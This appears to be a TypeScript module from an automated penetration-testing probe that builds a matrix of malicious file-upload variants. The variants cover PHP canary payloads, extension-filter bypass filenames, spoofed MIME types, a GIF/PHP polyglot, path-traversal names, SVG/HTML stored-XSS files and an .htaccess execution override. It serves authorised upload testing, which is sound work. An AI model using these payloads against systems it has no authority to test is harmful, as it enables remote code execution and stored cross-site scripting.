// File-upload attack matrix (WSTG-INPV-09), encoded as data so the probe runs EVERY technique every time
// — not whatever the agent remembers. Pure: a canary in → the full variant set out. Each variant mutates
// ONE dimension (extension / content-type / magic bytes / filename path / content) off a known-good image
// baseline, so a differential (accepted vs the baseline that must be accepted) isolates the missing check.

export interface UploadVariant {
  name: string
  category: "extension" | "content-type" | "magic-byte" | "filename-path" | "content" | "server-config"
  filename: string
  contentType: string
  content: string // latin1 bytes as a string (magic bytes included where relevant)
  // Why it matters + what an ACCEPT means, for the finding note.
  danger: string
}

// GIF89a magic — the smallest broadly-accepted "valid image" for the baseline and for content-sniff bypass.
const GIF = "GIF89a;"
// A benign, deterministic executable-canary body. `<?php echo CANARY ?>` returns the EVALUATED canary only
// if the server executes it (RCE); echoed verbatim only if stored+served (still a finding for XSS-able types).
function phpCanary(canary: string): string {
  return `<?php echo "${canary}"; ?>`
}
function svgCanary(canary: string): string {
  return `<svg xmlns="http://www.w3.org/2000/svg" onload="/*${canary}*/"><script>/*${canary}*/</script></svg>`
}

const DANGEROUS_EXT = [".php", ".php5", ".phtml", ".phar", ".asp", ".aspx", ".jsp", ".jspx", ".cgi", ".pl", ".sh"]
// Blacklist-bypass spellings of a .php upload.
const EXT_BYPASS = [
  "shell.php.jpg", // double extension (right side allowed)
  "shell.jpg.php", // double extension (left side allowed)
  "shell.pHp", // case
  "shell.php.", // trailing dot (Windows/Apache strip)
  "shell.php%20", // trailing space
  "shell.php%00.jpg", // null-byte truncation
  "shell.phtml", // alternate handler
  "shell.pHp5", // case + alt
  "shell.php::$DATA", // NTFS alternate data stream
]

// Build the full variant matrix for one upload, embedding `canary` so a retrieval check can prove
// stored/executed. `baseName` is the field the server expects (e.g. "avatar.png") — informational.
export function uploadVariants(canary: string): UploadVariant[] {
  const php = phpCanary(canary)
  const out: UploadVariant[] = []

  // A) dangerous extensions (plain)
  for (const ext of DANGEROUS_EXT)
    out.push({ name: `ext${ext}`, category: "extension", filename: `cs_${canary}${ext}`, contentType: "application/octet-stream", content: php, danger: `server-executable extension ${ext} accepted` })

  // A') extension blacklist-bypass spellings
  for (const fn of EXT_BYPASS)
    out.push({ name: `ext-bypass:${fn}`, category: "extension", filename: fn.replace("shell", `cs_${canary}`), contentType: "application/octet-stream", content: php, danger: `extension-filter bypass "${fn}" accepted` })

  // B) content-type spoof — php body declared as an image
  out.push({ name: "ct-spoof:image/png", category: "content-type", filename: `cs_${canary}.php`, contentType: "image/png", content: php, danger: "php body accepted when Content-Type is image/png (MIME trusted over content)" })
  out.push({ name: "ct-spoof:image/jpeg", category: "content-type", filename: `cs_${canary}.php`, contentType: "image/jpeg", content: php, danger: "php body accepted with a spoofed image/jpeg Content-Type" })

  // C) magic-byte / content-sniff bypass — real GIF magic then php
  out.push({ name: "magic:gif+php", category: "magic-byte", filename: `cs_${canary}.php`, contentType: "image/gif", content: `${GIF}\n${php}`, danger: "GIF-magic + php accepted (content-sniff bypass / polyglot)" })

  // D) filename path traversal — escape the upload dir into the webroot / overwrite
  out.push({ name: "path:../", category: "filename-path", filename: `../../cs_${canary}.php`, contentType: "application/octet-stream", content: php, danger: "traversal filename accepted — file may land outside the upload dir (webroot / overwrite)" })
  out.push({ name: "path:winsep", category: "filename-path", filename: `..\\..\\cs_${canary}.php`, contentType: "application/octet-stream", content: php, danger: "Windows-separator traversal filename accepted" })
  out.push({ name: "path:absolute", category: "filename-path", filename: `/var/www/html/cs_${canary}.php`, contentType: "application/octet-stream", content: php, danger: "absolute-path filename accepted" })

  // E) dangerous content in an allowed type — SVG (stored XSS / XXE surface), HTML (stored XSS)
  out.push({ name: "content:svg-xss", category: "content", filename: `cs_${canary}.svg`, contentType: "image/svg+xml", content: svgCanary(canary), danger: "SVG with inline script/onload accepted — stored XSS when served inline" })
  out.push({ name: "content:html", category: "content", filename: `cs_${canary}.html`, contentType: "text/html", content: `<html><script>/*${canary}*/</script>${canary}</html>`, danger: "HTML file accepted — stored XSS when served" })

  // F) server-config override — make the server execute uploaded files
  out.push({ name: "config:.htaccess", category: "server-config", filename: ".htaccess", contentType: "application/octet-stream", content: `AddType application/x-httpd-php .${canary}\n`, danger: ".htaccess accepted — attacker can make arbitrary extensions execute as php (Apache)" })
  out.push({ name: "config:web.config", category: "server-config", filename: "web.config", contentType: "application/octet-stream", content: `<?xml version="1.0"?><configuration><!--${canary}--></configuration>`, danger: "web.config accepted — IIS handler override" })

  return out
}

// The known-good control: a tiny valid GIF with an innocent name. It MUST be accepted; every dangerous
// variant is judged against it, so a filter that blocks the baseline (auth/CSRF/size) can't be mistaken
// for one that blocks the attack.
export function uploadBaseline(canary: string): UploadVariant {
  return { name: "baseline:valid-gif", category: "content", filename: `cs_${canary}.gif`, contentType: "image/gif", content: `${GIF}${canary}`, danger: "known-good image (control)" }
}
